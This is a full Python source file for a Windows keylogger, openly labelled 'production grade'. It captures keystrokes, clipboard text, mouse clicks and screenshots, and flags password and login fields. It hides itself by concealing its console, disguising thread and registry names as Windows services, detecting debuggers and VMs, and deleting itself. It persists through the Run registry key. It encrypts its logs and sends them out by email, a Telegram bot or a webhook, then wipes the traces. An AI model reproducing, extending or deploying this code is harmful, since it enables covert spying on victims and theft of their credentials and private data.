"""
Advanced Keylogger - Production Grade (v3.2 - FINAL FIX)
FIXES:
- Fixed Mutex to work without admin privileges 
- Single instance mutex 
- WindowInfo caching (checks every 1s)
- AES key size validation
- anti_debug disabled
- Optimized sleep intervals
"""

import threading
import time
import os
import sys
import smtplib
import zipfile
import subprocess
import ctypes
import secrets
import hashlib
import base64
import re
from datetime import datetime
from pathlib import Path
from email.message import EmailMessage
from dataclasses import dataclass, field
from typing import Optional, List, Tuple, Dict, Any
from collections import deque
from abc import ABC, abstractmethod
import json
import pickle
import sqlite3
import zlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import pyautogui
from pynput import keyboard, mouse
import win32gui
import win32clipboard
import win32api
import win32con
import win32process
import requests

# ______________________________________
# 0. Single Instance Check (FIXED for non-admin)
# \____________________________________/
def check_single_instance() -> bool:
    """Returns True if this is the only instance, exits if another exists"""
    try:
        
        mutex_name = "Local\\WindowsSysHelper_Instance_Mutex"
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
        last_error = ctypes.windll.kernel32.GetLastError()
        if last_error == 183:  # <---- ERROR_ALREADY_EXISTS
            return False
        return True
    except:
        return True  

# ______________________________________
# 1. Stealth & Anti-Analysis           |
# \____________________________________/
class Stealth:
    """Hide from user and basic analysis"""
    
    @staticmethod
    def hide_console():
        if sys.platform == "win32":
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    @staticmethod
    def is_debugger_present() -> bool:
        if sys.platform == "win32":
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        return False
    
    @staticmethod
    def is_running_in_vm() -> bool:
        vm_indicators = ["vbox", "vmware", "qemu", "virtual", "hyper-v", "kvm", "xen"]
        try:
            with open("/sys/class/dmi/id/product_name", "r") as f:
                product = f.read().lower()
                for indicator in vm_indicators:
                    if indicator in product:
                        return True
        except:
            pass
        try:
            import wmi
            c = wmi.WMI()
            for disk in c.Win32_DiskDrive():
                if any(ind in str(disk.Model).lower() for ind in ["vbox", "vmware", "qemu"]):
                    return True
        except:
            pass
        return False
    
    @staticmethod
    def rename_threads():
        current_thread = threading.current_thread()
        system_names = ["System Idle Monitor", "Windows Defender Network", "Runtime Broker", "svchost.exe"]
        if hasattr(current_thread, "name"):
            current_thread.name = secrets.choice(system_names)
    
    @staticmethod
    def self_delete():
        try:
            batch_file = Path(os.environ['TEMP']) / 'del.bat'
            with open(batch_file, 'w') as f:
                f.write(f'@echo off\n'
                       f':loop\n'
                       f'del "{sys.argv[0]}"\n'
                       f'if exist "{sys.argv[0]}" goto loop\n'
                       f'del "%~f0"\n')
            subprocess.Popen([str(batch_file)], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        except:
            pass

# ______________________________________
# 2. Secure Config                     |
# \____________________________________/
class SecureConfig:
    def __init__(self, config_dir: Path):
        self.config_dir = config_dir
        self.config_dir.mkdir(parents=True, exist_ok=True)
        self._master_key = self._derive_master_key()
        self._load_or_create_config()
    
    def _derive_master_key(self) -> bytes:
        machine_id = win32api.GetComputerName() + win32api.GetUserName()
        return hashlib.pbkdf2_hmac('sha256', machine_id.encode(), b'keylogger_salt', 100000)
    
    def _aes_gcm_encrypt(self, data: bytes) -> bytes:
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(self._master_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        return iv + encryptor.tag + ciphertext
    
    def _aes_gcm_decrypt(self, encrypted: bytes) -> bytes:
        iv = encrypted[:12]
        tag = encrypted[12:28]
        ciphertext = encrypted[28:]
        cipher = Cipher(algorithms.AES(self._master_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize()
    
    def _load_or_create_config(self):
        config_path = self.config_dir / "settings.enc"
        if config_path.exists():
            try:
                encrypted = config_path.read_bytes()
                data = json.loads(self._aes_gcm_decrypt(encrypted).decode())
                self.send_interval_sec = data.get('send_interval_sec', 300)
                self.size_threshold_bytes = data.get('size_threshold_bytes', 10240)
                self.max_log_size_mb = data.get('max_log_size_mb', 50)
                self.rotate_on_size = data.get('rotate_on_size', True)
                self.screenshot_on_send = data.get('screenshot_on_send', True)
                self.log_mouse = data.get('log_mouse', True)
                self.log_clipboard = data.get('log_clipboard', True)
                self.cleanup_after_send = data.get('cleanup_after_send', True)
                self.persist_through_reboot = data.get('persist_through_reboot', True)
                self.hide_console = data.get('hide_console', True)
                self.anti_debug = data.get('anti_debug', True)
                self.self_delete_on_exit = data.get('self_delete_on_exit', False)
                self.email_primary = tuple(data.get('email_primary', ("", "", "")))
                self.email_fallbacks = [tuple(e) for e in data.get('email_fallbacks', [])]
                self.telegram_bot_token = data.get('telegram_bot_token', "")
                self.telegram_chat_id = data.get('telegram_chat_id', "")
                self.webhook_url = data.get('webhook_url', "")
            except:
                self._set_defaults()
        else:
            self._set_defaults()
            self.save()
    
    def _set_defaults(self):
        self.send_interval_sec = 300
        self.size_threshold_bytes = 10240
        self.max_log_size_mb = 50
        self.rotate_on_size = True
        self.screenshot_on_send = True
        self.log_mouse = True
        self.log_clipboard = True
        self.cleanup_after_send = True
        self.persist_through_reboot = True
        self.hide_console = True
        self.anti_debug = False
        self.self_delete_on_exit = False
        self.email_primary = ("EMAIL-1", "PASSKEY", "EMAIL-2")
        self.email_fallbacks = []
        self.telegram_bot_token = ""
        self.telegram_chat_id = ""
        self.webhook_url = ""
    
    def save(self):
        data = {
            'send_interval_sec': self.send_interval_sec,
            'size_threshold_bytes': self.size_threshold_bytes,
            'max_log_size_mb': self.max_log_size_mb,
            'rotate_on_size': self.rotate_on_size,
            'screenshot_on_send': self.screenshot_on_send,
            'log_mouse': self.log_mouse,
            'log_clipboard': self.log_clipboard,
            'cleanup_after_send': self.cleanup_after_send,
            'persist_through_reboot': self.persist_through_reboot,
            'hide_console': self.hide_console,
            'anti_debug': self.anti_debug,
            'self_delete_on_exit': self.self_delete_on_exit,
            'email_primary': list(self.email_primary),
            'email_fallbacks': [list(e) for e in self.email_fallbacks],
            'telegram_bot_token': self.telegram_bot_token,
            'telegram_chat_id': self.telegram_chat_id,
            'webhook_url': self.webhook_url,
        }
        encrypted = self._aes_gcm_encrypt(json.dumps(data).encode())
        (self.config_dir / "settings.enc").write_bytes(encrypted)

# ______________________________________
# 3. AES-256-GCM Encryption (FIXED)    |
# \____________________________________/
class CryptoManager:
    def __init__(self, key_path: Path, config_dir: Path):
        self.key_path = key_path
        self.config_dir = config_dir
        self.master_key = self._load_or_create_key()
    
    def _load_or_create_key(self) -> bytes:
        """Load key or create new one with size validation"""
        if self.key_path.exists():
            try:
                key = self.key_path.read_bytes()
                if len(key) == 32:
                    return key
                else:
                    self.key_path.unlink()
            except:
                pass
        
        key = secrets.token_bytes(32)
        self.key_path.write_bytes(key)
        return key
    
    def encrypt(self, data: bytes) -> bytes:
        iv = secrets.token_bytes(12)
        cipher = Cipher(algorithms.AES(self.master_key), modes.GCM(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(data) + encryptor.finalize()
        return iv + encryptor.tag + ciphertext
    
    def decrypt(self, encrypted: bytes) -> bytes:
        iv = encrypted[:12]
        tag = encrypted[12:28]
        ciphertext = encrypted[28:]
        cipher = Cipher(algorithms.AES(self.master_key), modes.GCM(iv, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        return decryptor.update(ciphertext) + decryptor.finalize()

# ______________________________________
# 4. Log Manager                       |
# \____________________________________/
class LogManager:
    def __init__(self, log_path: Path, crypto: CryptoManager, config: SecureConfig):
        self.log_path = log_path
        self.crypto = crypto
        self.config = config
        self.buffer: deque = deque(maxlen=200)
        self._lock = threading.Lock()
        self.total_logged_since_flush = 0
        self.bytes_pending = 0
    
    def append(self, text: str):
        with self._lock:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f')[:-3]
            line = f"[{timestamp}] {text}"
            self.buffer.append(line)
            self.bytes_pending += len(line.encode('utf-8'))
            self.total_logged_since_flush += len(line)
            
            if len(self.buffer) >= 50 or self.bytes_pending >= 4096:
                self.flush()
    
    def flush(self):
        with self._lock:
            if not self.buffer:
                return
            
            if self.config.rotate_on_size and self.log_path.exists():
                if self.log_path.stat().st_size > (self.config.max_log_size_mb * 1024 * 1024):
                    self._rotate()
            
            data = "\n".join(self.buffer).encode('utf-8')
            compressed = zlib.compress(data, level=6)
            encrypted = self.crypto.encrypt(compressed)
            
            with open(self.log_path, "ab") as f:
                f.write(len(encrypted).to_bytes(4, 'little'))
                f.write(encrypted)
            
            self.buffer.clear()
            self.bytes_pending = 0
    
    def _rotate(self):
        if self.log_path.exists():
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            archive_path = self.log_path.parent / f"{self.log_path.stem}_{timestamp}{self.log_path.suffix}"
            self.log_path.rename(archive_path)
    
    def get_total_size(self) -> int:
        return self.log_path.stat().st_size if self.log_path.exists() else 0
    
    def clear(self):
        with self._lock:
            if self.log_path.exists():
                size = self.log_path.stat().st_size
                with open(self.log_path, 'wb') as f:
                    f.write(os.urandom(size))
                self.log_path.unlink()
            self.buffer.clear()
            self.total_logged_since_flush = 0
            self.bytes_pending = 0

# ______________________________________
# 5. Smart Sender                      |
# \____________________________________/
class SmartSender:
    def __init__(self, log_manager: LogManager, config: SecureConfig):
        self.log = log_manager
        self.config = config
        self.last_send_time = time.time()
        self.last_total_bytes = 0
        self.failed_attempts = 0
        self._lock = threading.Lock()
    
    def should_send(self) -> bool:
        with self._lock:
            time_passed = (time.time() - self.last_send_time) >= self.config.send_interval_sec
            current_total = self.log.get_total_size()
            new_data = current_total - self.last_total_bytes
            size_exceeded = new_data >= self.config.size_threshold_bytes
            return time_passed or size_exceeded
    
    def mark_sent(self, success: bool):
        with self._lock:
            if success:
                self.last_send_time = time.time()
                self.last_total_bytes = self.log.get_total_size()
                self.failed_attempts = 0
            else:
                self.failed_attempts += 1
                backoff = min(3600, 60 * (2 ** self.failed_attempts))
                self.last_send_time = time.time() + backoff

# ______________________________________
# 6. Multi-Channel Sender
# \____________________________________/
class MultiChannelSender:
    def __init__(self, config: SecureConfig):
        self.config = config
    
    def send_report(self, zip_path: Path) -> bool:
        success = False
        if self.config.email_primary[0]:
            success = self._send_email(zip_path) or success
        if self.config.telegram_bot_token and self.config.telegram_chat_id:
            success = self._send_telegram(zip_path) or success
        if self.config.webhook_url:
            success = self._send_webhook(zip_path) or success
        return success
    
    def _send_email(self, zip_path: Path) -> bool:
        smtp_servers = [
            ("smtp.gmail.com", 587),
            ("smtp-mail.outlook.com", 587),
            ("smtp.yandex.com", 465)
        ]
        sender, password, receiver = self.config.email_primary
        for host, port in smtp_servers:
            if self._try_smtp(host, port, sender, password, receiver, zip_path):
                return True
        for sender, password, receiver in self.config.email_fallbacks:
            for host, port in smtp_servers:
                if self._try_smtp(host, port, sender, password, receiver, zip_path):
                    return True
        return False
    
    def _try_smtp(self, host: str, port: int, sender: str, password: str, receiver: str, zip_path: Path) -> bool:
        try:
            msg = EmailMessage()
            msg["Subject"] = f"Report - {datetime.now():%Y%m%d_%H%M%S} - {os.environ.get('COMPUTERNAME', 'unknown')}"
            msg["From"] = sender
            msg["To"] = receiver
            msg.set_content("Keylogger report attached.")
            with open(zip_path, "rb") as f:
                msg.add_attachment(f.read(), maintype="application", subtype="zip", filename=zip_path.name)
            if port == 465:
                with smtplib.SMTP_SSL(host, port, timeout=30) as smtp:
                    smtp.login(sender, password)
                    smtp.send_message(msg)
            else:
                with smtplib.SMTP(host, port, timeout=30) as smtp:
                    smtp.starttls()
                    smtp.login(sender, password)
                    smtp.send_message(msg)
            return True
        except Exception:
            return False
    
    def _send_telegram(self, zip_path: Path) -> bool:
        try:
            url = f"https://api.telegram.org/bot{self.config.telegram_bot_token}/sendDocument"
            with open(zip_path, 'rb') as f:
                resp = requests.post(url, files={'document': f}, data={'chat_id': self.config.telegram_chat_id}, timeout=30)
            return resp.status_code == 200
        except:
            return False
    
    def _send_webhook(self, zip_path: Path) -> bool:
        try:
            with open(zip_path, 'rb') as f:
                resp = requests.post(self.config.webhook_url, files={'file': f}, timeout=30)
            return resp.status_code == 200
        except:
            return False

# ______________________________________
# 7. Screenshot Manager
# \____________________________________/
class ScreenshotManager:
    @staticmethod
    def take(output_dir: Path) -> Optional[Path]:
        try:
            screenshot_path = output_dir / f"screen_{datetime.now():%Y%m%d_%H%M%S}.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path, compress_level=6)
            return screenshot_path
        except Exception:
            try:
                from mss import mss
                with mss() as sct:
                    sct.shot(output=str(screenshot_path))
                return screenshot_path
            except:
                return None

# ______________________________________
# 8. Clipboard Monitor                 |
# \____________________________________/
class ClipboardMonitor:
    def __init__(self, log_manager: LogManager):
        self.log = log_manager
        self.last_content = ""
        self._lock = threading.Lock()
    
    def check_and_log(self):
        with self._lock:
            for attempt in range(3):
                try:
                    win32clipboard.OpenClipboard()
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        content = win32clipboard.GetClipboardData()
                        if content and content != self.last_content:
                            self.log.append(f"[CLIPBOARD] {content[:500]}")
                            self.last_content = content
                    win32clipboard.CloseClipboard()
                    break
                except:
                    time.sleep(0.05)
                    continue

# ______________________________________
# 9. Persistence                       |
# \____________________________________/
class Persistence:
    @staticmethod
    def install(exe_path: str):
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsSysHelper", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except:
            pass

# ______________________________________
# 10. Window Info Extractor            |
# \____________________________________/
class WindowInfo:
    """Extracts detailed information about the active window"""
    
    PASSWORD_PATTERNS = [
        r'password', r'passwort', r'passwd', r'pwd', r'passcode',
        r'secret', r'pin', r'token', r'credential', r'auth',
        r'رمز', r'پسورد', r'گذرواژه', r'کلمه عبور'
    ]
    
    USERNAME_PATTERNS = [
        r'username', r'user', r'login', r'email', r'account',
        r'کاربری', r'ایمیل', r'نام کاربری', r'یوزر', r'حساب'
    ]
    
    LOGIN_URL_PATTERNS = [
        r'login', r'signin', r'auth', r'account', r'password',
        r'login\.', r'sign_in', r'logon'
    ]
    
    # Cache
    _last_context_time = 0
    _cached_context = None
    
    @staticmethod
    def get_active_window_title() -> str:
        try:
            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
        except:
            return "Unknown"
    
    @staticmethod
    def get_active_process_name() -> str:
        try:
            hwnd = win32gui.GetForegroundWindow()
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            handle = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION | win32con.PROCESS_VM_READ, False, pid)
            path = win32process.GetModuleFileNameEx(handle, 0)
            handle.Close()
            return Path(path).name
        except:
            return "Unknown"
    
    @staticmethod
    def get_browser_url() -> Optional[str]:
        """Try to extract URL from browser address bar"""
        try:
            window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            url_pattern = r'(https?://[^\s<>"]+)'
            match = re.search(url_pattern, window_title)
            if match:
                return match.group(1)
            return None
        except:
            return None
    
    @staticmethod
    def detect_field_context() -> str:
        """Detect if user is in password/username field by window title patterns"""
        title = WindowInfo.get_active_window_title().lower()
        url = WindowInfo.get_browser_url()
        
        for pattern in WindowInfo.PASSWORD_PATTERNS:
            if re.search(pattern, title, re.IGNORECASE):
                return "🔑 PASSWORD FIELD"
        
        for pattern in WindowInfo.USERNAME_PATTERNS:
            if re.search(pattern, title, re.IGNORECASE):
                return "👤 USERNAME FIELD"
        
        if url:
            for pattern in WindowInfo.LOGIN_URL_PATTERNS:
                if re.search(pattern, url, re.IGNORECASE):
                    return "🔐 LOGIN PAGE"
        
        return ""
    
    @staticmethod
    def get_full_context() -> dict:
        """Get complete window context with caching (only refresh every 1 second)"""
        now = time.time()
        
        # Return cached if less than 1 second old
        if WindowInfo._cached_context and (now - WindowInfo._last_context_time) < 1.0:
            return WindowInfo._cached_context
        
        title = WindowInfo.get_active_window_title()
        process = WindowInfo.get_active_process_name()
        url = WindowInfo.get_browser_url()
        field = WindowInfo.detect_field_context()
        
        context_parts = [f"Program: {process}"]
        if "chrome" in process.lower() or "firefox" in process.lower() or "msedge" in process.lower() or "browser" in process.lower():
            if url:
                context_parts.append(f"URL: {url}")
            context_parts.append(f"Title: {title}")
        else:
            context_parts.append(f"Window: {title}")
        
        if field:
            context_parts.append(field)
        
        result = {
            'process': process,
            'title': title,
            'url': url,
            'field': field,
            'context_str': " | ".join(context_parts)
        }
        
        WindowInfo._cached_context = result
        WindowInfo._last_context_time = now
        return result

# ______________________________________
# 11. Smart Text Buffer (Improved)     |
# \____________________________________/

class TextBuffer:
    """Keeps track of typed text per window - logs complete words/sentences"""
    
    def __init__(self, log_manager: LogManager):
        self.log = log_manager
        self.current_text = ""
        self.last_window_process = ""
        self.last_window_title = ""
        self._buffer_lock = threading.Lock()
        self._last_key_time = time.time()
        self._timer = None  
        self.TIMEOUT = 0.5  
        
    def _flush_text(self, context: str, reason: str = "typing"):
        """Send accumulated text to log as a complete sentence"""
        with self._buffer_lock:
            if self.current_text.strip():
                self.log.append(f"[TEXT|{reason}|{context}] {self.current_text}")
                self.current_text = ""
    
    def _start_timer(self, context: str):
        if self._timer:
            self._timer.cancel()

        current_context = context
        self._timer = threading.Timer(self.TIMEOUT, self._flush_text, args=(current_context, "pause"))
        self._timer.daemon = True
        self._timer.start()
    
    def process_key(self, key_str: str) -> None:
        with self._buffer_lock:

            window_info = WindowInfo.get_full_context()
            current_process = window_info['process']
            current_title = window_info['title']
            context = window_info['context_str']
            
            window_changed = (current_process != self.last_window_process or 
                             current_title != self.last_window_title)
            
            if window_changed and self.current_text.strip():
                old_context = f"Program: {self.last_window_process} | Window: {self.last_window_title}"
                self._flush_text(old_context, "window_switch")
                self.log.append(f"[WINDOW] Switched to: {context}")
                if window_info['field']:
                    self.log.append(f"[CONTEXT] {window_info['field']}")
            
            elif window_changed:
                self.log.append(f"[WINDOW] Switched to: {context}")
                if window_info['field']:
                    self.log.append(f"[CONTEXT] {window_info['field']}")
            
            self.last_window_process = current_process
            self.last_window_title = current_title
            
            if key_str == "\n":
                if self.current_text.strip():
                    self._flush_text(context, "enter")
                else:
                    self.log.append("[ENTER]")
                if self._timer:
                    self._timer.cancel()
                    self._timer = None
                return
            
            if key_str == "[BS]":
                if self.current_text:
                    self.current_text = self.current_text[:-1]
                    self._start_timer(context)
                else:
                    self.log.append("[BS]")
                return
            
            if key_str == " ":
                self.current_text += " "
                self._start_timer(context)
                return
            
            special_keys = ["[CTRL]", "[SHIFT]", "[ALT]", "[TAB]", "[ESC]", "[WIN]",
                           "[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]",
                           "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]",
                           "[INSERT]", "[DELETE]", "[HOME]", "[END]",
                           "[PAGE_UP]", "[PAGE_DOWN]", "[PRINT_SCREEN]",
                           "[SCROLL_LOCK]", "[PAUSE]", "[CAPS_LOCK]",
                           "[NUM_LOCK]", "[LEFT]", "[RIGHT]", "[UP]", "[DOWN]"]
            
            if key_str in special_keys:
                if self.current_text.strip():
                    self._flush_text(context, "special_key")
                self.log.append(key_str)
                return
            
            self.current_text += key_str
            self._start_timer(context)
# ______________________________________
# 12. Main Engine                      |
# \____________________________________/
class KeyloggerEngine:
    def __init__(self, config: SecureConfig):
        self.config = config
        
        if config.anti_debug and Stealth.is_debugger_present():
            sys.exit(0)
        if config.hide_console:
            Stealth.hide_console()
        
        Stealth.rename_threads()
        
        self.crypto = CryptoManager(config.config_dir / "sys.key", config.config_dir)
        self.log = LogManager(config.config_dir / "cache.dat", self.crypto, config)
        self.sender = SmartSender(self.log, config)
        self.channel_sender = MultiChannelSender(config)
        self.clipboard_monitor = ClipboardMonitor(self.log) if config.log_clipboard else None
        
        self.text_buffer = TextBuffer(self.log)
        
        self.running = True
        self._system_info_written = False
        
        Persistence.install(sys.argv[0])
    
    def _write_system_info(self):
        if not self._system_info_written:
            import socket, getpass, platform
            info = f"""===== SYSTEM INFO =====
Hostname: {socket.gethostname()}
Username: {getpass.getuser()}
IP: {socket.gethostbyname(socket.gethostname())}
OS: {platform.system()} {platform.release()}
Started: {datetime.now()}
========================
"""
            self.log.append(info)
            self.log.flush()
            self._system_info_written = True
    
    def on_press(self, key):
        try:
            if hasattr(key, 'char') and key.char:
                key_str = key.char
            elif key == keyboard.Key.space:
                key_str = " "
            elif key == keyboard.Key.enter:
                key_str = "\n"
            elif key == keyboard.Key.backspace:
                key_str = "[BS]"
            elif key == keyboard.Key.tab:
                key_str = "[TAB]"
            elif key == keyboard.Key.esc:
                key_str = "[ESC]"
            elif key == keyboard.Key.cmd:
                key_str = "[WIN]"
            elif key == keyboard.Key.caps_lock:
                key_str = "[CAPS_LOCK]"
            elif key == keyboard.Key.num_lock:
                key_str = "[NUM_LOCK]"
            elif key == keyboard.Key.scroll_lock:
                key_str = "[SCROLL_LOCK]"
            elif key == keyboard.Key.print_screen:
                key_str = "[PRINT_SCREEN]"
            elif key == keyboard.Key.pause:
                key_str = "[PAUSE]"
            elif key == keyboard.Key.insert:
                key_str = "[INSERT]"
            elif key == keyboard.Key.delete:
                key_str = "[DELETE]"
            elif key == keyboard.Key.home:
                key_str = "[HOME]"
            elif key == keyboard.Key.end:
                key_str = "[END]"
            elif key == keyboard.Key.page_up:
                key_str = "[PAGE_UP]"
            elif key == keyboard.Key.page_down:
                key_str = "[PAGE_DOWN]"
            elif key == keyboard.Key.left:
                key_str = "[LEFT]"
            elif key == keyboard.Key.right:
                key_str = "[RIGHT]"
            elif key == keyboard.Key.up:
                key_str = "[UP]"
            elif key == keyboard.Key.down:
                key_str = "[DOWN]"
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                key_str = "[CTRL]"
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
                key_str = "[SHIFT]"
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                key_str = "[ALT]"
            elif key == keyboard.Key.f1: key_str = "[F1]"
            elif key == keyboard.Key.f2: key_str = "[F2]"
            elif key == keyboard.Key.f3: key_str = "[F3]"
            elif key == keyboard.Key.f4: key_str = "[F4]"
            elif key == keyboard.Key.f5: key_str = "[F5]"
            elif key == keyboard.Key.f6: key_str = "[F6]"
            elif key == keyboard.Key.f7: key_str = "[F7]"
            elif key == keyboard.Key.f8: key_str = "[F8]"
            elif key == keyboard.Key.f9: key_str = "[F9]"
            elif key == keyboard.Key.f10: key_str = "[F10]"
            elif key == keyboard.Key.f11: key_str = "[F11]"
            elif key == keyboard.Key.f12: key_str = "[F12]"
            else:
                key_str = f"[{str(key)}]"
            
            self.text_buffer.process_key(key_str)
            
        except Exception:
            pass
    
    def on_click(self, x, y, button, pressed):
        if self.config.log_mouse and pressed:
            try:
                window_info = WindowInfo.get_full_context()
                context = window_info['context_str']
                self.log.append(f"[MOUSE|{context}] {button} at ({x},{y})")
            except:
                self.log.append(f"[MOUSE] {button} at ({x},{y})")
    
    def periodic_loop(self):
        last_clipboard_check = 0
        last_heartbeat = 0
        
        while self.running:
            time.sleep(3)
            
            if self.clipboard_monitor and (time.time() - last_clipboard_check) >= 3:
                self.clipboard_monitor.check_and_log()
                last_clipboard_check = time.time()
            
            if (time.time() - last_heartbeat) >= 120:
                self.log.append("[HEARTBEAT]")
                last_heartbeat = time.time()
            
            if self.sender.should_send():
                self._send_report()
    
    def _send_report(self):
        self.log.flush()
        
        screenshot = None
        if self.config.screenshot_on_send:
            screenshot = ScreenshotManager.take(self.config.config_dir)
        
        files_to_zip = [self.config.config_dir / "cache.dat"]
        if screenshot and screenshot.exists():
            files_to_zip.append(screenshot)
        
        zip_path = self.config.config_dir / f"report_{datetime.now():%Y%m%d_%H%M%S}.zip"
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
            for f in files_to_zip:
                if f.exists():
                    zf.write(f, f.name)
        
        success = self.channel_sender.send_report(zip_path)
        
        if success:
            self.sender.mark_sent(success=True)
            if self.config.cleanup_after_send:
                zip_path.unlink(missing_ok=True)
                if screenshot:
                    screenshot.unlink(missing_ok=True)
                self.log.clear()
        else:
            self.sender.mark_sent(success=False)
    
    def run(self):
        self._write_system_info()
        
        win_info = WindowInfo.get_full_context()
        self.log.append(f"[WINDOW] Initial: {win_info['context_str']}")
        
        sender_thread = threading.Thread(target=self.periodic_loop, daemon=True)
        sender_thread.name = "Windows Defender Service"
        sender_thread.start()
        
        with keyboard.Listener(on_press=self.on_press) as kb, \
             mouse.Listener(on_click=self.on_click) as ms:
            kb.join()
            ms.join()
    
    def stop(self):
        self.running = False
        self.log.flush()
        
        if self.config.self_delete_on_exit:
            Stealth.self_delete()

# ______________________________________
# 13. Entry Point                      |
# \____________________________________/
if __name__ == "__main__":

    if not check_single_instance():
        sys.exit(0)
    
    appdata = Path(os.environ.get('APPDATA', 'C:\\Windows\\Temp')) / 'SysCache'
    config = SecureConfig(appdata)
    engine = KeyloggerEngine(config)
    
    try:
        engine.run()
    except KeyboardInterrupt:
        engine.stop()
    except Exception as e:
        crash_log = appdata / "crash.log"
        with open(crash_log, 'a', encoding='utf-8') as f:
            f.write(f"[{datetime.now()}] CRASH: {e}\n")
            import traceback
            traceback.print_exc(file=f)

